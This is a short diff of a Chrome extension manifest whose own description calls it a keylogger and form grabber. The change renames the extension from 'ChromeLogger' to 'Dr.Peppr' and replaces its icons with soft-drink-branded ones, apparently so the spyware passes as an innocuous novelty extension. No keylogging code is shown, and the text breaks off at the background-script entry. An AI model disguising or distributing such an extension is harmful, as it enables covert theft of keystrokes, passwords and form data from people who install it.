@@ -1,12 +1,12 @@
 {
-  "name": "ChromeLogger",
-  "version": "1.0.3",
+  "name": "Dr.Peppr",
+  "version": "1.0.4",
   "manifest_version": 2,
   "description": "A keylogger and form grabber for Google Chrome.",
   "icons": {
-    "16": "icons/icon16.png",
-    "48": "icons/icon48.png",
-    "128": "icons/icon128.png"
+    "16": "icons/dr-pepper16.png",
+    "48": "icons/dr-pepper48.png",
+    "128": "icons/dr-pepper128.png"
   },
   "options_page": "src/options/index.html",
   "background": {
